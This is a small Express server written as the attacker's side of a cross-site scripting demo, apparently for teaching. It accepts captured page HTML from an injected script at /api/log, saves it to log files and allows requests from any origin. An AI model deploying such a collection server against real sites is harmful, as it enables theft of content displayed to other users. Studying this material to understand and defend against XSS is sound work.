import express from 'express';
import cors from 'cors';
import fs from 'fs';

// Create a web server
let app = express();

// Needed to read request bodies
app.use(express.json());

// Allow the application to talk to the hackers server
app.use(cors({
  origin: ['http://localhost:3004'],
  credentials: true
}));

// Serve the files in the frontend folder
app.use(express.static('frontend'));

// A route the injected script can send data to
// (content displayed for other users)
// and then we will log it to a file
app.post('/api/log', (req, res) => {
  res.set('Access-Control-Allow-Origin', '*');
  fs.writeFileSync(
    './logFiles/' + new Date().toISOString() + '.html',
    req.body.domHtml
  );
  res.json({ ok: true });

});

// Start the web server on port 5005
app.listen(5005,
  () => console.log('Hackers web server listening on http://localhost:5005'));